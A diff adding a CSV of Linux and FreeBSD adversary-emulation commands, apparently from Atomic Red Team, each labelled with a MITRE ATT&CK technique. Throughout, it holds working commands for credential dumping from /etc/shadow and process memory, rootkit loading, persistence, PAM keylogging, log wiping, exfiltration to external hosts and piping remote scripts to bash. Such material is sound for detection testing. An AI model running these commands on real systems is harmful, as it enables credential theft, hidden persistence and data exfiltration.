@@ -1,0 +1,1188 @@
+command,attack_technique,technique_name
+"cat ""PathToAtomicsFolder/script.sh"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""PathToAtomicsFolder/image.jpg"" - > ""PathToAtomicsFolder/evil_image.jpg""; strings ""PathToAtomicsFolder/evil_image.jpg"" | tail -n 1 | base64 -d | sh",T1001.002,Data Obfuscation via Steganography
+"sh /tmp/T1003.007.sh
+PID=$(pgrep -n -f ""T1003.007"")
+HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
+MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
+MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
+MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+dd if=/proc/""${PID}""/mem of=""/tmp/T1003.007.bin"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
+grep -i ""PASS"" ""/tmp/T1003.007.bin""",T1003.007,OS Credential Dumping: Proc Filesystem
+"sh /tmp/T1003.007.sh
+PID=$(pgrep -n -f ""T1003.007"")
+MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
+MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
+MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+dd if=/proc/""${PID}""/mem of=""/tmp/T1003.007.bin"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
+strings ""/tmp/T1003.007.bin"" | grep -i PASS",T1003.007,OS Credential Dumping: Proc Filesystem
+"sh /tmp/T1003.007.sh
+PID=$(pgrep -n -f ""T1003.007"")
+PYTHON=$(which python || which python3 || which python2)
+$PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin
+grep -i ""PASS"" ""/tmp/T1003.007.bin""",T1003.007,OS Credential Dumping: Proc Filesystem
+"sudo bash ""PathToAtomicsFolder/../ExternalPayloads/mimipenguin/mimipenguin.sh"" > ""/tmp/T1003.007Test3.txt""
+cat ""/tmp/T1003.007Test3.txt""",T1003.007,OS Credential Dumping: Proc Filesystem
+"sudo cat /etc/shadow > /tmp/T1003.008.txt
+cat /tmp/T1003.008.txt",T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
+"sudo cat /etc/master.passwd > /tmp/T1003.008.txt
+cat /tmp/T1003.008.txt",T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
+"cat /etc/passwd > /tmp/T1003.008.txt
+cat /tmp/T1003.008.txt",T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
+"unamestr=$(uname)
+if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > /tmp/T1003.008.txt; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > /tmp/T1003.008.txt; fi",T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
+"testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
+[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
+testcat /etc/passwd
+testcat /etc/shadow",T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
+"cd $HOME
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
+chmod +x sqlite_dump.sh
+find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;",T1005,Data from Local System
+"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;",T1007,System Service Discovery
+"echo ""[*] Listing SysV init scripts (/etc/init.d):""
+if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi
+echo
+echo ""[*] Listing runlevel directories (/etc/rc*.d):""
+ls -ld /etc/rc*.d 2>/dev/null || echo ""No /etc/rc*.d directories found""",T1007,System Service Discovery
+sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko,T1014,Rootkit
+sudo modprobe T1014,T1014,Rootkit
+"echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload
+/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""",T1014,Rootkit
+"sudo modprobe diamorphine
+ping -c 10 localhost >/dev/null & TARGETPID=""$!""
+ps $TARGETPID
+kill -31 $TARGETPID
+ps $TARGETPID || echo ""process ${TARGETPID} hidden""",T1014,Rootkit
+"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;
+if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;",T1016,System Network Configuration Discovery
+ping -c 4 8.8.8.8,T1016.001,System Network Configuration Discovery: Internet Connection Discovery
+arp -a | grep -v '^?',T1018,Remote System Discovery
+"for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo ""192.168.1.$ip UP"" || : ; done",T1018,Remote System Discovery
+ip neighbour show,T1018,Remote System Discovery
+ip route show,T1018,Remote System Discovery
+netstat -r | grep default,T1018,Remote System Discovery
+"ip tcp_metrics show |grep --invert-match ""^127\.""",T1018,Remote System Discovery
+"find / -name ""known_hosts"" -type f 2>/dev/null | while read -r file; do echo ""=== $file ==="" >> /tmp/ssh_enum.txt; cat ""$file"" >> /tmp/ssh_enum.txt; done",T1018,Remote System Discovery
+"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;
+cat /tmp/encoded.dat | $cmd > /tmp/art.sh
+chmod +x /tmp/art.sh
+/tmp/art.sh",T1027,Obfuscated Files or Information
+"dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary #adds null bytes
+dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary #adds high-quality random data
+dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary #adds low-quality random data",T1027.001,Obfuscated Files or Information: Binary Padding
+truncate -s +1 /tmp/evil-binary #adds a byte to the file size,T1027.001,Obfuscated Files or Information: Binary Padding
+cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx /tmp/packed_bin && /tmp/packed_bin,T1027.002,Obfuscated Files or Information: Software Packing
+cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin,T1027.002,Obfuscated Files or Information: Software Packing
+"gcc PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out
+clang PathToAtomicsFolder/T1027.004/src/T1027-004-test.c && ./a.out",T1027.004,Obfuscated Files or Information: Compile After Delivery
+"g++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out
+clang++ PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc && ./a.out",T1027.004,Obfuscated Files or Information: Compile After Delivery
+go run PathToAtomicsFolder/T1027.004/src/T1027-004-test.go,T1027.004,Obfuscated Files or Information: Compile After Delivery
+"$encodedString = ""WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=""
+$bytes = [System.Convert]::FromBase64String($encodedString)
+$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
+#write the decoded eicar string to file
+$decodedString | Out-File $env:temp\T1027.013_decodedEicar.txt",T1027.013,Obfuscated Files or Information: Encrypted/Encoded File
+"$encryptedString = ""76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA=""
+$key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32
+$decrypt = ConvertTo-SecureString -String $encryptedString -Key $key
+$decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt))
+#Write the decrypted eicar string to a file
+$decryptedString | Out-File $env:temp\T1027.013_decryptedEicar.txt",T1027.013,Obfuscated Files or Information: Encrypted/Encoded File
+"echo '#!/bin/bash' > /tmp/art_payload.sh
+echo 'echo ""T1027.013: Payload extracted from encrypted ZIP""' >> /tmp/art_payload.sh
+echo 'echo ""Hostname: $(hostname)""' >> /tmp/art_payload.sh
+echo 'echo ""User: $(whoami)""' >> /tmp/art_payload.sh
+echo 'uname -a' >> /tmp/art_payload.sh
+cd /tmp && zip -P ""infected"" art_encrypted.zip art_payload.sh
+rm /tmp/art_payload.sh
+echo ""Encrypted ZIP created. Extracting with password...""
+unzip -P ""infected"" -o /tmp/art_encrypted.zip -d /tmp/
+echo ""Executing extracted payload:""
+bash /tmp/art_payload.sh",T1027.013,Obfuscated Files or Information: Encrypted/Encoded File
+"cd /tmp/T1030; split -b 5000000 T1030_urandom
+ls -l /tmp/T1030",T1030,Data Transfer Size Limits
+"users
+w
+who",T1033,System Owner/User Discovery
+"cp /bin/sh /tmp/crond;
+echo 'sleep 5' | /tmp/crond",T1036.003,Masquerading: Rename System Utilities
+"/tmp/T1036_004_prctl_rename & ps
+TMP=`ps | grep totally_legit`
+if [ -z ""${TMP}"" ] ; then echo ""renamed process NOT FOUND in process list"" && exit 1; fi
+exit 0",T1036.004,Masquerading: Masquerade Task or Service
+"eval '(while true; do :; done) &'
+echo $! > /tmp/evil_pid.txt
+random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)
+sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)",T1036.004,Masquerading: Masquerade Task or Service
+"mkdir $HOME/...
+cp $(which sh) $HOME/...
+$HOME/.../sh -c ""echo Hello from the Atomic Red Team test T1036.005#1""",T1036.005,Masquerading: Match Legitimate Name or Location
+"mkdir -p /tmp/atomic-test-T1036.006
+cd /tmp/atomic-test-T1036.006
+mkdir -p 'testdirwithspaceend '
+[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null
+chmod +x 'testdirwithspaceend /init '
+'./testdirwithspaceend /init '",T1036.006,Masquerading: Space after Filename
+"echo '#!/bin/sh' > /tmp/report.pdf.sh
+echo 'echo ""Simulating malicious double extension execution""' >> /tmp/report.pdf.sh
+chmod +x /tmp/report.pdf.sh
+/tmp/report.pdf.sh",T1036.007,Masquerading: Double File Extension
+"echo '#!/bin/sh' > /tmp/image.png
+echo 'echo ""Running script masked as PNG""' >> /tmp/image.png
+sh /tmp/image.png",T1036.008,Masquerading: Masquerade File Type
+"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"""" | sudo tee -a /etc/rc.common
+printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+sudo chmod +x /etc/rc.common",T1037.004,Boot or Logon Initialization Scripts: Rc.common
+"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
+echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local
+printf 'exit 0' | sudo tee -a /etc/rc.local
+sudo chmod +x /etc/rc.local",T1037.004,Boot or Logon Initialization Scripts: Rc.common
+"tcpdump -c 5 -nnni ens33
+tshark -c 5 -i ens33",T1040,Network Sniffing
+"tcpdump -c 5 -nnni em0
+tshark -c 5 -i em0",T1040,Network Sniffing
+sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3,T1040,Network Sniffing
+sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3,T1040,Network Sniffing
+sudo /tmp/t1040_linux_pcapdemo -a -t 3,T1040,Network Sniffing
+sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3,T1040,Network Sniffing
+sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3,T1040,Network Sniffing
+sudo /tmp/t1040_linux_pcapdemo -a -f -t 3,T1040,Network Sniffing
+for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done,T1046,Network Service Discovery
+"sudo nmap -sS 192.168.1.0/24 -p 80
+telnet 192.168.1.1 80
+nc -nv 192.168.1.1 80",T1046,Network Service Discovery
+nmap -Pn -sV -p 0-65535 127.0.0.1,T1046,Network Service Discovery
+"ssh target.example.com ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz",T1048,Exfiltration Over Alternative Protocol
+tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc',T1048,Exfiltration Over Alternative Protocol
+"dig @8.8.8.8 -p 53 $(echo ""this is a secret info"" | base64).google.com",T1048,Exfiltration Over Alternative Protocol
+curl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/,T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+"wget --post-file=""PathToAtomicsFolder/T1048.002/src/artifact"" --timeout=5 --no-check-certificate https://example.com/ --delete-after",T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate https://example.com/ --delete-after",T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9
+if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi",T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi,T1049,System Network Connections Discovery
+"netstat
+who -a",T1049,System Network Connections Discovery
+"sockstat -4
+sockstat -6 2>/dev/null || true
+sockstat -l 2>/dev/null || true",T1049,System Network Connections Discovery
+"echo ""echo Hello from Atomic Red Team"" | at now + 1 minute",T1053.002,Scheduled Task/Job: At
+"crontab -l > /tmp/notevil
+echo ""* * * * * /tmp/evil.sh"" > /tmp/persistevil && crontab /tmp/persistevil",T1053.003,Scheduled Task/Job: Cron
+"echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" > /etc/cron.daily/persistevil
+echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" > /etc/cron.hourly/persistevil
+echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" > /etc/cron.monthly/persistevil
+echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" > /etc/cron.weekly/persistevil",T1053.003,Scheduled Task/Job: Cron
+"echo ""echo '*/5     *       *       *       *       root    echo ""Hello from Atomic Red Team""' > /tmp/atomic.log"" > /etc/cron.d/persistevil",T1053.003,Scheduled Task/Job: Cron
+"echo ""echo 'Hello from Atomic Red Team' > /tmp/atomic.log"" >> /var/spool/cron/crontabs/persistevil",T1053.003,Scheduled Task/Job: Cron
+"echo ""[Unit]"" > /etc/systemd/system/art-timer.service
+echo ""Description=Atomic Red Team Systemd Timer Service"" >> /etc/systemd/system/art-timer.service
+echo ""[Service]"" >> /etc/systemd/system/art-timer.service
+echo ""Type=simple"" >> /etc/systemd/system/art-timer.service
+echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> /etc/systemd/system/art-timer.service
+echo ""[Install]"" >> /etc/systemd/system/art-timer.service
+echo ""WantedBy=multi-user.target"" >> /etc/systemd/system/art-timer.service
+echo ""[Unit]"" > /etc/systemd/system/art-timer.timer
+echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> /etc/systemd/system/art-timer.timer
+echo ""Requires=art-timer.service"" >> /etc/systemd/system/art-timer.timer
+echo ""[Timer]"" >> /etc/systemd/system/art-timer.timer
+echo ""Unit=art-timer.service"" >> /etc/systemd/system/art-timer.timer
+echo ""OnCalendar=*-*-* *:*:00"" >> /etc/systemd/system/art-timer.timer
+echo ""[Install]"" >> /etc/systemd/system/art-timer.timer
+echo ""WantedBy=timers.target"" >> /etc/systemd/system/art-timer.timer
+systemctl start art-timer.timer
+systemctl enable art-timer.timer
+systemctl daemon-reload",T1053.006,Scheduled Task/Job: Systemd Timers
+"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053.006,Scheduled Task/Job: Systemd Timers
+"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053.006,Scheduled Task/Job: Systemd Timers
+PathToAtomicsFolder/T1055.009/bin/inplace_instruction_overwrite,T1055.009,Process Injection: Proc Memory
+PathToAtomicsFolder/T1055.009/bin/instruction_overwrite_jump,T1055.009,Process Injection: Proc Memory
+PathToAtomicsFolder/T1055.009/bin/got_injection,T1055.009,Process Injection: Proc Memory
+PathToAtomicsFolder/T1055.009/bin/return_address_overwrite,T1055.009,Process Injection: Proc Memory
+PathToAtomicsFolder/T1055.009/bin/rop_mprotect_return_address_overwrite,T1055.009,Process Injection: Proc Memory
+PathToAtomicsFolder/T1055.009/bin/return_address_overwrite_fullROPchain,T1055.009,Process Injection: Proc Memory
+"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
+if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
+sudo touch /tmp/password-auth.bk
+sudo touch /tmp/system-auth.bk sudo echo ""session    required    pam_tty_audit.so
+enable=* log_password"" >> /etc/pam.d/password-auth sudo echo ""session    required    pam_tty_audit.so
+enable=* log_password"" >> /etc/pam.d/system-auth",T1056.001,Input Capture: Keylogging
+"PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t ""$USER[$$] $SSH_CONNECTION "")'
+echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""
+tail /var/log/syslog",T1056.001,Input Capture: Keylogging
+"PS2=`logger -t ""$USER"" -f ~/.sh_history`
+$PS2
+tail /var/log/messages",T1056.001,Input Capture: Keylogging
+"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> /tmp/.keyboard.log' DEBUG
+echo ""Hello World!""
+cat /tmp/.keyboard.log",T1056.001,Input Capture: Keylogging
+"cp -v /etc/pam.d/sshd /tmp/
+echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> /etc/pam.d/sshd
+systemctl restart sshd
+systemctl restart auditd
+ssh ubuntu@localhost 
+whoami
+sudo su
+whoami
+exit
+exit",T1056.001,Input Capture: Keylogging
+"auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
+auditctl -a always,exit -F arch=b32 -S execve -k CMDS
+whoami; ausearch -i --start now",T1056.001,Input Capture: Keylogging
+"ps >> /tmp/loot.txt
+ps aux >> /tmp/loot.txt",T1057,Process Discovery
+"sh -c ""echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh""
+sh -c ""echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh""
+chmod +x /tmp/art.sh
+sh /tmp/art.sh",T1059.004,Command and Scripting Interpreter: Bash
+"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash",T1059.004,Command and Scripting Interpreter: Bash
+"chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
+bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh",T1059.004,Command and Scripting Interpreter: Bash
+"chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh
+bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh",T1059.004,Command and Scripting Interpreter: Bash
+"TMPFILE=$(mktemp)
+echo ""id"" > $TMPFILE
+bash $TMPFILE",T1059.004,Command and Scripting Interpreter: Bash
+"echo $0
+if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi
+if $(printenv SHELL >/dev/null); then printenv SHELL; fi",T1059.004,Command and Scripting Interpreter: Bash
+cat /etc/shells ,T1059.004,Command and Scripting Interpreter: Bash
+"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done",T1059.004,Command and Scripting Interpreter: Bash
+"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
+ART=$(echo -n ""id"" | $encodecmd)
+echo ""\$ART=$ART""
+echo -n ""$ART"" | $decodecmd |/bin/bash
+unset ART",T1059.004,Command and Scripting Interpreter: Bash
+"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
+cat /etc/passwd |grep ^art
+chsh -s /bin/sh art
+cat /etc/passwd |grep ^art",T1059.004,Command and Scripting Interpreter: Bash
+"export ART='echo ""Atomic Red Team was here... T1059.004""'
+echo $ART |/bin/sh",T1059.004,Command and Scripting Interpreter: Bash
+"cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash
+ls -la /tmp/art.txt      ",T1059.004,Command and Scripting Interpreter: Bash
+uname -srm,T1059.004,Command and Scripting Interpreter: Bash
+"awk 'BEGIN {system(""/bin/sh &"")}'",T1059.004,Command and Scripting Interpreter: Bash
+"echo '! exec ""/bin/sh &""' | PERL_MM_USE_DEFAULT=1  cpan",T1059.004,Command and Scripting Interpreter: Bash
+busybox sh &,T1059.004,Command and Scripting Interpreter: Bash
+"sudo emacs -Q -nw --eval '(term ""/bin/sh &"")'",T1059.004,Command and Scripting Interpreter: Bash
+"which_python=$(which python || which python3 || which python3.9 || which python2)
+$which_python -c 'import requests;import os;url = ""https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"";malicious_command = ""sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"";session = requests.session();source = session.get(url).content;fd = open(""T1059.006-payload"", ""wb+"");fd.write(source);fd.close();os.system(malicious_command)'",T1059.006,Command and Scripting Interpreter: Python
+"which_python=$(which python || which python3 || which python3.9 || which python2)
+echo 'import requests' > T1059.006.py
+echo 'import os' >> T1059.006.py
+echo 'url = ""https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh""' >> T1059.006.py
+echo 'malicious_command = ""sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles""' >> T1059.006.py
+echo 'session = requests.session()' >> T1059.006.py
+echo 'source = session.get(url).content' >> T1059.006.py
+echo 'fd = open(""T1059.006-payload"", ""wb+"")' >> T1059.006.py
+echo 'fd.write(source)' >> T1059.006.py
+echo 'fd.close()' >> T1059.006.py
+echo 'os.system(malicious_command)' >> T1059.006.py
+$which_python T1059.006.py",T1059.006,Command and Scripting Interpreter: Python
+"which_python=$(which python || which python3 || which python3.9 || which python2)
+echo 'import requests' > T1059.006.py
+echo 'import os' >> T1059.006.py
+echo 'url = ""https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh""' >> T1059.006.py
+echo 'malicious_command = ""sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles""' >> T1059.006.py
+echo 'session = requests.session()' >> T1059.006.py
+echo 'source = session.get(url).content' >> T1059.006.py
+echo 'fd = open(""T1059.006-payload"", ""wb+"")' >> T1059.006.py
+echo 'fd.write(source)' >> T1059.006.py
+echo 'fd.close()' >> T1059.006.py
+echo 'os.system(malicious_command)' >> T1059.006.py
+$which_python -c 'import py_compile; py_compile.compile(""T1059.006.py"", ""T1059.006.pyc"")'
+$which_python T1059.006.pyc",T1059.006,Command and Scripting Interpreter: Python
+"which_python=$(which python || which python3 || which python3.9 || which python2)
+$which_python -c ""import pty;pty.spawn('/bin/sh')""
+exit
+$which_python -c ""import pty;pty.spawn('/bin/bash')""
+exit",T1059.006,Command and Scripting Interpreter: Python
+"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi;
+if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi;
+cat /etc/group",T1069.001,Permission Groups Discovery: Local Groups
+"ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b ""CN=Users,DC=example,DC=com"" ""(objectClass=group)"" -s sub -a always -z 1000 dn ",T1069.002,Permission Groups Discovery: Domain Groups
+rm ~/.bash_history,T1070.003,Indicator Removal on Host: Clear Command History
+"echo """" > ~/.bash_history",T1070.003,Indicator Removal on Host: Clear Command History
+cat /dev/null > ~/.bash_history,T1070.003,Indicator Removal on Host: Clear Command History
+ln -sf /dev/null ~/.bash_history,T1070.003,Indicator Removal on Host: Clear Command History
+truncate -s0 ~/.bash_history,T1070.003,Indicator Removal on Host: Clear Command History
+"unset HISTFILE
+export HISTFILESIZE=0
+history -c",T1070.003,Indicator Removal on Host: Clear Command History
+"set +o history
+echo 'set +o history' >> ~/.bashrc
+. ~/.bashrc
+history -c",T1070.003,Indicator Removal on Host: Clear Command History
+"hostname
+whoami",T1070.003,Indicator Removal on Host: Clear Command History
+sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname,T1070.003,Indicator Removal on Host: Clear Command History
+docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log,T1070.003,Indicator Removal on Host: Clear Command History
